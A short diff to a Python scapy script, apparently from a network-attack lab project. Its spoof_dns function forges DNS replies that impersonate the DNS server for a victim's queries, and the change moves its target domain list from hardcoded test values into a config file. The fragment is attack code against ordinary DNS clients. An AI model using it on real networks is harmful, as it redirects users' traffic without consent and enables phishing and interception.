@@ -1,12 +1,5 @@
 from scapy.all import *
-
-# TEST TEST TEST TEST TEST
-dns_domains = {
-	b"google.nl": "1.2.3.4",
-	b"google.com": "1.2.3.4",
-	b"tue.nl": "1.2.3.4",
-	b"tue.com": "1.2.3.4"
-}
+from config import config
 
 def spoof_dns(pkt, interface):
 	victim_mac = pkt[Ether].src
@@ -14,8 +7,8 @@ def spoof_dns(pkt, interface):
 	dns_server_ip = pkt[IP].dst
 	qname = pkt[DNSQR].qname
 	
-	for domain, fake_ip in dns_domains.items():
-		if domain in qname:
+	for domain, fake_ip in config.dns.domains:
+		if domain.encode() in qname:
 			ether = Ether(dst = victim_mac)
 			ip = IP(src=dns_server_ip, dst=victim_ip)
 			udp = UDP(sport=53, dport=pkt[UDP].sport)
